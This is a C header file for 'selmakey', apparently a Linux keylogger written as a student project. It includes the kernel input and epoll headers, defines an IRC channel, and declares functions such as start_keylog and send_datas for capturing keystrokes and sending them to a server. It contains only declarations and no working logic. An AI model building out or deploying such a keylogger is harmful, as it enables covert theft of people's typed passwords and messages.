/*
** selmakey.h for selmakey in /home/casoni_f/Projets/selma/selmakey/special
** 
** Made by Fabien Casoni
** Login   <casoni_f@epitech.net>
** 
** Started on  Wed Jul  2 18:58:49 2014 Fabien Casoni
** Last update Thu Jul 17 19:08:36 2014 Moghrabi Alexandre
*/

#ifndef		_SELMAKEY_H_
# define	_SELMAKEY_H_

# include <stdio.h>
# include <linux/input.h>
# include <sys/epoll.h>

# define NB_MAX_EVENTS 100
# define IRC_CHANNEL "#jeejland"

typedef struct		s_kl
{
  int			fd;
  int			epoll_fd;
  int			ctrl;
  int			ret;
  struct epoll_event	epoll_event;
  struct epoll_event	*events;
  FILE			*file;
  struct input_event	kbd_event;
  int			server_fd;
}			t_kl;

int init(t_kl *);
void start_keylog(t_kl *);
void send_datas(int fd, int key);
void *server_thread(void *datas);

#endif		/* _SELMAKEY_H_ */
